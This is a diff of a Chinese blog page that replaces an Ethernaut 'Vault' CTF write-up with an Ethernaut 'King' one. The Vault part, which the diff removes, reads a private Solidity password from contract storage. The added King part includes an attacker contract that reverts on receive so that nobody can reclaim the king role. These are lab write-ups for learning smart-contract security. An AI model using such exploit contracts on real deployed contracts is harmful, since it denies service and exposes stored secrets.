@@ -21,22 +21,22 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="这道题很明显是需要我们知道 password 的值才可以，而 password 是 private 的，这就难了，没法直接从合约中读取出来，不过有过一点 solidity 编程经验的同学应该都知道 solidity 中的 private 变量只是外部合约不能读取其值，但是由于它是存在于区块链上的，区块链上的内容都是开源的。所以其实我们还是有办法读取 private 变量的值的">
+  <meta name="description" content="这道题当时做的时候还是耗费了一些时间的。后面决定静下心来，把每一行代码都想清楚，其实也就不难做了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ethernaut题解 - Vault">
-<meta property="og:url" content="http://yoursite.com/2020/06/26/Ethernaut%E9%A2%98%E8%A7%A3-Vault/index.html">
+<meta property="og:title" content="Ethernaut题解 - King">
+<meta property="og:url" content="http://yoursite.com/2020/11/05/Ethernaut%E9%A2%98%E8%A7%A3-King/index.html">
 <meta property="og:site_name" content="PolarSpace">
-<meta property="og:description" content="这道题很明显是需要我们知道 password 的值才可以，而 password 是 private 的，这就难了，没法直接从合约中读取出来，不过有过一点 solidity 编程经验的同学应该都知道 solidity 中的 private 变量只是外部合约不能读取其值，但是由于它是存在于区块链上的，区块链上的内容都是开源的。所以其实我们还是有办法读取 private 变量的值的">
+<meta property="og:description" content="这道题当时做的时候还是耗费了一些时间的。后面决定静下心来，把每一行代码都想清楚，其实也就不难做了。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-06-25T16:52:20.000Z">
-<meta property="article:modified_time" content="2020-06-29T14:18:06.432Z">
+<meta property="article:published_time" content="2020-11-05T09:24:39.000Z">
+<meta property="article:modified_time" content="2020-11-05T09:42:52.810Z">
 <meta property="article:author" content="PolarSpace">
 <meta property="article:tag" content="Solidity">
 <meta property="article:tag" content="合约安全">
 <meta property="article:tag" content="Ethernaut">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/2020/06/26/Ethernaut%E9%A2%98%E8%A7%A3-Vault/">
+<link rel="canonical" href="http://yoursite.com/2020/11/05/Ethernaut%E9%A2%98%E8%A7%A3-King/">
 
 
 <script id="page-configurations">
@@ -49,7 +49,7 @@
   };
 </script>
 
-  <title>Ethernaut题解 - Vault | PolarSpace</title>
+  <title>Ethernaut题解 - King | PolarSpace</title>
   
 
 
@@ -170,7 +170,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/Ethernaut%E9%A2%98%E8%A7%A3-Vault/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/Ethernaut%E9%A2%98%E8%A7%A3-King/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/myhead.jpeg">
@@ -183,7 +183,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Ethernaut题解 - Vault
+          Ethernaut题解 - King
         </h1>
 
         <div class="post-meta">
@@ -192,16 +192,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-06-26 00:52:20" itemprop="dateCreated datePublished" datetime="2020-06-26T00:52:20+08:00">2020-06-26</time>
+              <time title="创建时间：2020-11-05 17:24:39 / 修改时间：17:42:52" itemprop="dateCreated datePublished" datetime="2020-11-05T17:24:39+08:00">2020-11-05</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-29 22:18:06" itemprop="dateModified" datetime="2020-06-29T22:18:06+08:00">2020-06-29</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -223,45 +217,22 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>这道题很明显是需要我们知道 password 的值才可以，而 password 是 private 的，这就难了，没法直接从合约中读取出来，不过有过一点 solidity 编程经验的同学应该都知道 solidity 中的 private 变量只是外部合约不能读取其值，但是由于它是存在于区块链上的，区块链上的内容都是开源的。所以其实我们还是有办法读取 private 变量的值的</p>
+        <p>这道题当时做的时候还是耗费了一些时间的。后面决定静下心来，把每一行代码都想清楚，其实也就不难做了。</p>
 <a id="more"></a>
 
-<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>在做这道题的时候，我还不知道怎么去读取 private 的值，所以就 Google 了一下，查询到我们可以使用<a href="https://stackoverflow.com/questions/50493197/solidity-accessing-private-variable" target="_blank" rel="noopener">这种方法</a>去获取：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">"0x501..."</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+<p>题目的目的是让我们拿到 king 的权限，而题目中也说了，当提交的时候，系统会重新 reclaim king 权限。那么我们仔细分析一下这段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>第一个参数是合约地址，第二个参数是状态变量的位置。那么我们就把题目部署好的合约地址复制进去，注意到 password 是第二个状态变量，所以第二个参数就是 1（从 0 开始）。由于我对 Python 比较熟悉，所以我就利用 Web3.py 库进行调用。不过其实使用 Javascript 更加简单</p>
-<h4 id="使用-Python-调用"><a href="#使用-Python-调用" class="headerlink" title="使用 Python 调用"></a>使用 Python 调用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">ropsten = <span class="string">'https://ropsten.infura.io/v3/输入你的Infura ID'</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(ropsten))</span><br><span class="line"></span><br><span class="line">abi = json.loads(<span class="string">'题目合约的abi，可以复制到Remix中编译得到'</span>)</span><br><span class="line">contract_address = web3.toChecksumAddress(<span class="string">'合约地址'</span>)</span><br><span class="line">contract = web3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line">print(web3.eth.getStorageAt(contract_address, <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
-
-<p>打印出来，结果为</p>
+<p>首先，我们要拿到 king 权限，还是很容易的，直接调用一个不存在的函数，就会进入 fallback 函数了，然后 king 权限就归我们了。但问题是，只要我们一提交题目，系统也会来调用 fallback 函数。这样的话，king 权限又回去了。</p>
+<p>当时的第一想法是让系统在调用 fallback 的时候执行失败，也就是让这个 require 不满足从而导致失败，想了半天，发现不可能做到。因为系统是 owner，而 owner 总是能够通过 require 教研的。这可怎么办，当时在这里卡了挺久，为此我还去特意看了 ownable 的源码，去验证系统是不是 owner，结果发现确实是。</p>
+<p>在这里卡了很久的原因是自己一直是想在 require 这里寻找突破口。但是后面我就往下面看了一下:</p>
 <blockquote>
-<p>b’A very strong secret password :)’</p>
+<p>king.transfer(msg.value);</p>
 </blockquote>
-<p>这是一个字节字符串，我们需要将它从字符串转换为 bytes32 类型才可以，Google 了一下<a href="https://ethereum.stackexchange.com/questions/9142/how-to-convert-a-string-to-bytes32" target="_blank" rel="noopener">转换方法</a>，我们通过这个方法就可以将上面的字符串转换为 bytes32 类型的，注意使用该方法时，参数没有前面的 b，即：</p>
-<blockquote>
-<p>A very strong secret password :)</p>
-</blockquote>
-<p>转换得到的结果为</p>
-<blockquote>
-<p>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</p>
-</blockquote>
-<p>这是一个 16 进制的数字，是可以作为参数直接传入题目的 unlock 函数的，在题目的控制台中，输入：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.unlock(<span class="string">'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>发起交易，等待执行成功，再看看 locked 的值，已经变成了 false：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.locked()</span><br></pre></td></tr></table></figure>
-
-<p>点击 Submit，发起交易，通关！</p>
-<h4 id="使用-Javascript-调用"><a href="#使用-Javascript-调用" class="headerlink" title="使用 Javascript 调用"></a>使用 Javascript 调用</h4><p>上面使用 Python 的方法很繁琐，其实我们直接在控制台中使用 Javascript 调用就可以了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contractAddress, 1)</span><br></pre></td></tr></table></figure>
-
-<p>但是 MetaMask 中有点问题，是和回调函数相关的（这里我没有深究），因此直接这样调用会出错，所以，应该这样调用：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contractAddress, <span class="number">1</span>, </span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>) </span>&#123;password = result&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>打印 password 直接就能获取到上面那个 0x412… 开头的数，然后剩余步骤相同，将其作为参数调用 unlock 函数即可。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题给我们的启发就是不要依赖 Solidity 中的 private 变量，它并不是那么地 private。</p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://stackoverflow.com/questions/50493197/solidity-accessing-private-variable" target="_blank" rel="noopener">https://stackoverflow.com/questions/50493197/solidity-accessing-private-variable</a></p>
-<p><a href="https://ethereum.stackexchange.com/questions/9142/how-to-convert-a-string-to-bytes32" target="_blank" rel="noopener">https://ethereum.stackexchange.com/questions/9142/how-to-convert-a-string-to-bytes32</a></p>
-<p><a href="https://medium.com/coinmonks/ethernaut-vault-problem-b2675393650b" target="_blank" rel="noopener">https://medium.com/coinmonks/ethernaut-vault-problem-b2675393650b</a></p>
+<p>transfer 函数会不会失败呢。怎么可能呢，给人转账怎么会失败呢？</p>
+<p>再想想，一定是给人转账吗？</p>
+<p>有思路了，这个 king 不一定是人呀，也可能是合约呀。也就是说，我们写一个合约，通过合约去调用题目里的 fallback 函数，那么 king 就是我们写的合约，然后我们再使这个合约禁止接收转账不就好了吗。想到这里便豁然开朗，那么就直接写出了合约：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.0;</span><br><span class="line"></span><br><span class="line">contract ImTheKing &#123;</span><br><span class="line">    </span><br><span class="line">    address public king &#x3D; 题目实例地址;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 这里通过这种方法，调用一个不存在的函数，并且打入一定数量的 ETH, 那么便会进入 fallback 函数，</span><br><span class="line">    &#x2F;&#x2F; 因为题目合约中是有一定数量的 ETH 的，我记得是 0.1 ETH，</span><br><span class="line">    &#x2F;&#x2F; 所以我们要在调用这个函数的时候打入超过 0.1 个 ETH，就能满足 fallback 函数中的条件）</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        king.call.value(msg.value)(abi.encodeWithSignature(&quot;nonExist()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 当提交题目的时候，系统也会调用一次 fallback 函数</span><br><span class="line">    &#x2F;&#x2F; 而我们这里将 receive 实现为 revert()，也就是只要进入 receive 就会失败</span><br><span class="line">    &#x2F;&#x2F; 那么系统调用 fallback 就会失败，也就通过了这道题</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -282,13 +253,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/06/25/Ethernaut%E9%A2%98%E8%A7%A3-Coin-Flip/" rel="prev" title="Ethernaut题解 - Coin Flip">
-      <i class="fa fa-chevron-left"></i> Ethernaut题解 - Coin Flip
+    <a href="/2020/11/05/Ethernaut%E9%A2%98%E8%A7%A3-Force/" rel="prev" title="Ethernaut题解 - Force">
+      <i class="fa fa-chevron-left"></i> Ethernaut题解 - Force
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/06/29/WETH%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90/" rel="next" title="WETH 源码剖析">
-      WETH 源码剖析 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -347,7 +315,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解"><span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-Python-调用"><span class="nav-text">使用 Python 调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-Javascript-调用"><span class="nav-text">使用 Javascript 调用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-text">参考资料</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
